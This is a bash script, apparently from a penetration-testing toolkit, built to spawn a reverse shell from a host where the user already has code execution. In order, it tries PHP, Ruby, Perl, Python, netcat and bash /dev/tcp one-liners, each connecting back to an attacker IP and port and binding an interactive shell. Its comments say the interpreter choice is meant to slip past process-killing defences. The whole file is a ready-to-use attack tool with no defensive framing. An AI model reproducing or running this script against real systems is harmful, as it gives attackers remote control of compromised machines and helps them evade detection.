#!/bin/bash
# ========================================
#  zc00l shell spawning shell script
#  helps with unknown rce environments
# ========================================
#  This script will try to open a tcp reverse shell
#  at the target IP and port using numerous techniques
#  to ensure that the shell will spawn if it is possible.
#  The order for reverse shell commands take as this:
#  PHP, Ruby, Perl, Python, Nc and Bash.
#  In order to avoid automated process-killing scripts
#  or avoid suspicious 'bash' processes.
# ========================================

TARGET="IPHERE";
PORT=1234;

chk() {
    if [ $? -eq 0 ]; then
        echo "[+] Reverse shell successfully opened."
        exit 0;
    fi
}

# == Environment Data Scraping =================================================================
# This script uses bash, nc, python, perl, ruby and php to connect back to the attacker machine.
#  This section will try to enumerate the path to their binary using the environment variables.
#  If it is not succesful, then we set the value to the default used in most systems.
# ==============================================================================================
if [ "$(which bash)" == "" ]; then
    BASH_PATH="/bin/bash";
else
    BASH_PATH=$(which bash);
fi
if [ "$(which python)" == "" ]; then
    PYTHON_PATH="/usr/bin/python";
else
    PYTHON_PATH=$(which python);
fi
if [ "$(which nc)" == "" ]; then
    NC_PATH="/bin/nc";
else
    NC_PATH=$(which nc);
fi
if [ "$(which ruby)" == "" ]; then
    RUBY_PATH="/usr/bin/ruby";
else
    RUBY_PATH=$(which ruby);
fi
if [ "$(which perl)" == "" ]; then
    PERL_PATH="/usr/bin/perl";
else
    PERL_PATH=$(which perl);
fi
if [ "$(which php)" == "" ]; then
    PHP_PATH="/usr/bin/php";
else
    PHP_PATH=$(which php);
fi

echo "[*] Trying to connect back to $TARGET:$PORT";

i=1;

if [ -f $PHP_PATH ]; then
    echo "[+] Technique $i: $PHP_PATH "
    $PHP_PATH -r "\$sock=fsockopen('$TARGET',$PORT);exec('/bin/sh -i <&3 >&3 2>&3');"
    chk;
    i=$((i+1));
fi

if [ -f $RUBY_PATH ]; then
    echo "[+] Technique $i: $RUBY_PATH -rsocket -e 'exit if fork;c=TCPSocket.new...";
    $RUBY_PATH -rsocket -e "exit if fork;c=TCPSocket.new(\"$TARGET\",\"$PORT\");while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read}end"
    chk;
    i=$((i+1));
fi

if [ -f $PERL_PATH ]; then
    echo "[+] Technique $i: perl -e 'use Socket;\$i=...'";
    $PERL_PATH -e "use Socket;\$i='$TARGET';\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};"
    chk;
    i=$((i+1));

    echo "[+] Technique $i: perl -MIO -e '\$p=forkl exit,if(...'"
    $PERL_PATH -MIO -e "\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,'$TARGET:$PORT');STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;"
    chk;
    i=$((i+1));
fi

if [ -f $PYTHON_PATH ]; then
    echo "[+] Technique $i: python -c 'import socket,subprocess,os;s=socket...'";
    python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$TARGET',$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"
    chk;
    i=$((i+1));
fi

if [ -f $NC_PATH ]; then
    echo "[+] Technique $i: $NC_PATH -e /bin/bash TARGET PORT";
    $NC_PATH -e /bin/bash $TARGET $PORT;
    chk;
    i=$((i+1));

    echo "[+] Technique $i: $NC_PATH -e /bin/sh TARGET PORT";
    $NC_PATH -e /bin/sh $TARGET $PORT;
    chk;
    i=$((i+1));
fi

echo "[+] Technique $i: $BASH_PATH -i >& /dev/tcp/IP/port 0>&1";
$BASH_PATH -i >& /dev/tcp/$TARGET/$PORT 0>&1
chk;
i=$((i+1));

echo "[+] A lot of techniques were tried. If you see this, well... you may have problems.";
exit 1337

